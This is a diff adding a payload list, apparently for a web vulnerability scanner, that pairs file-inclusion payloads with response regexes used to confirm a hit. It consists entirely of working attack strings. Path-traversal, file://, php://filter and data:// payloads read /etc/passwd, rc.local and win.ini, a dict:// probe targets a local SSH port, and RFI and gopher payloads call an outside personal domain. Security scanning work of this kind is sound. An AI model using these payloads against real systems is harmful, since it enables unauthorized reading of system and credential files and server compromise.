@@ -1,0 +1,14 @@
+{type="lfi"}{payload="/etc/passwd"}{response="root:[a-z]{1}a:\d+:\d+:[a-zA-Z0-9_-]+:[/a-zA-Z0-9_-]+:/bin/bash"}{payload_confirm="/etc/rc.d/rc.local"}{response_confirm="#!/bin/"}
+{type="lfi"}{payload="../../../../../../../../../../etc/passwd"}{response="root:[a-z]{1}a:\d+:\d+:[a-zA-Z0-9_-]+:[/a-zA-Z0-9_-]+:/bin/bash"}{payload_confirm="/etc/rc.d/rc.local"}{response_confirm="#!/bin/"}
+{type="lfi"}{payload="../../../../../../../../../../sbin/../etc/./rc.d/../rc.d/.././rc.local"}{response="#!/bin/"}
+{type="lfi"}{payload="c:/windows/win.ini"}{response="; for \d\d\-bit app support"}
+{type="lfi"}{payload="data://text/plain;base64,aGVsbG8gd29ybGQh"}{response="hello world!"}
+{type="lfi"}{payload="file:///etc/passwd"}{response="root:[a-z]{1}a:\d+:\d+:[a-zA-Z0-9_-]+:[/a-zA-Z0-9_-]+:/bin/bash"}{payload_confirm="file:///etc/rc.d/rc.local"}{response_confirm="#!/bin/"}
+{type="lfi"}{payload="../../../../../../../../../../etc/rc.d/rc.local"}{response="#!/bin/"}
+{type="lfi"}{payload="file:///etc/rc.d/rc.local"}{response="#!/bin/"}
+{type="lfi"}{payload="dict://127.0.0.1:22"}{response="\-OpenSSH_"}
+{type="lfi"}{payload="php://filter/convert.base64-encode/resource=../../../../../../../../../../etc/passwd"}{response="cm9vdD"}
+#注意这里的域名是个人域名
+{type="rfi"}{payload="http://woshiyingxiong.com:8080/fi/rfi?s=urlSource"}{response="92fd38975fa07e87d83340a677b04432"}
+{type="rfi"}{payload="@woshiyingxiong.com:8080/fi/rfi?s=urlSource"}{response="92fd38975fa07e87d83340a677b04432"}
+{type="rfi"}{payload="gopher://woshiyingxiong.com:8080/_GET%20/fi/rfi%20HTTP/1.1%0D%0AHost%3Awoshiyingxiong.com:8080%0D%0A"}{response="92fd38975fa07e87d83340a677b04432"}
